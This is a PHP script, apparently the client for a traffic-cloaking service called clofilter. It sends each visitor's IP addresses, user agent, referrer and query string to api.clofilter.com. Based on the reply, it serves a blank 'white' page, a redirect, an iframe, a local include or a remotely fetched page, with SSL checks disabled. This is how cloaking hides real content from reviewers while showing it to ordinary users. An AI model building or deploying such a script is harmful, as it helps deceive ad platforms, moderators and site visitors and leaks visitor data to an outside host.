<?php
error_reporting(0);
$data = array(
    'companyId' => "XXX",
    'referrerCF' => $_GET["referrerCF"],
    'urlCF' => $_GET["urlCF"],
    'QUERY_STRING' => $_SERVER["QUERY_STRING"],
    'HTTP_REFERER' => $_SERVER["HTTP_REFERER"],
    'HTTP_USER_AGENT' => $_SERVER["HTTP_USER_AGENT"],
    'REMOTE_ADDR' => $_SERVER["REMOTE_ADDR"],
    'HTTP_CF_CONNECTING_IP' => $_SERVER["HTTP_CF_CONNECTING_IP"],
    'CF_CONNECTING_IP' => $_SERVER["CF_CONNECTING_IP"],
    'X_FORWARDED_FOR' => $_SERVER["X_FORWARDED_FOR"],
    'TRUE_CLIENT_IP' => $_SERVER["TRUE_CLIENT_IP"],
);
$curl = curl_init('http://api.clofilter.com/v1/check');
curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($data));
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
    'Content-Type: application/json',
    'Content-Length: ' . strlen(json_encode($data))
));
$api = json_decode(curl_exec($curl));
curl_close($curl);
$arrContextOptions = array('ssl' => array('verify_peer' => false, 'verify_peer_name' => false), 'http' => array('header' => 'User-Agent: ' . $_SERVER['HTTP_USER_AGENT']));
if ($api->standartIntegration) {
    if (file_exists($api->simplePage)) {
        if ($api->type == 'load') {
            if ($api->redirectQuery) {
                header('Location: ?' . $api->redirectQuery);
            } else {
                require_once($api->simplePage);
            }
        }
        if ($api->type == 'redirect') {
            header('Location: ' . $api->pageWithParams);
        }
        exit;
    }
    if ($api->type == 'load') {
        if ($api->redirectQuery) {
            header('Location: ?' . $api->redirectQuery);
        } else {
            echo str_replace('<head>', '<head><base href="' . $api->simplePage . '" />', file_get_contents($api->simplePage, false, stream_context_create($arrContextOptions)));
        }
    }
    if ($api->type == 'redirect') {
        header('Location: ' . $api->pageWithParams);
    }
    if ($api->type == 'iframe') {
        echo '<iframe src="' . $api->pageWithParams . '" width="100%" height="100%" align="left"></iframe> <style> body { padding: 0; margin: 0; } iframe { margin: 0; padding: 0; border: 0; } </style>';
    }
} else {
    if ($api->pageType == 'white') {
        echo '';
        exit;
    }
    if (file_exists($api->simplePage)) {
        if ($api->type == 'load') {
            if ($api->redirectQuery) {
                $api->pageHTML = '<head><meta http-equiv="refresh" content="0; URL=' .$api->originPage . '?' . $api->redirectQuery . '" /></head>';
            } else {
                $api->pageHTML = file_get_contents($api->simplePage, false, stream_context_create($arrContextOptions));
            }
        }
        if ($api->type == 'redirect') {
            $api->pageHTML = '<head><meta http-equiv="refresh" content="0; URL=' . $api->pageWithParams . '" /></head>';
        }
    } else {
        if ($api->type == 'load') {
            if ($api->redirectQuery) {
                $api->pageHTML = '<head><meta http-equiv="refresh" content="0; URL=' .$api->originPage . '?' . $api->redirectQuery . '" /></head>';
            } else {
                $api->pageHTML = str_replace('<head>', '<head><base href="' . $api->simplePage . '" />', file_get_contents($api->simplePage, false, stream_context_create($arrContextOptions)));
            }
        }
        if ($api->type == 'redirect') {
            $api->pageHTML = '<head><meta http-equiv="refresh" content="0; URL=' . $api->pageWithParams . '" /></head>';
        }
        if ($api->type == 'iframe') {
            $api->pageHTML = '<iframe src="' . $api->pageWithParams . '" width="100%" height="100%" align="left"></iframe> <style> body { padding: 0; margin: 0; } iframe { margin: 0; padding: 0; border: 0; } </style>';
        }
    }
    echo 'document.open();document.write(`' . $api->pageHTML . '`);document.close();';
}
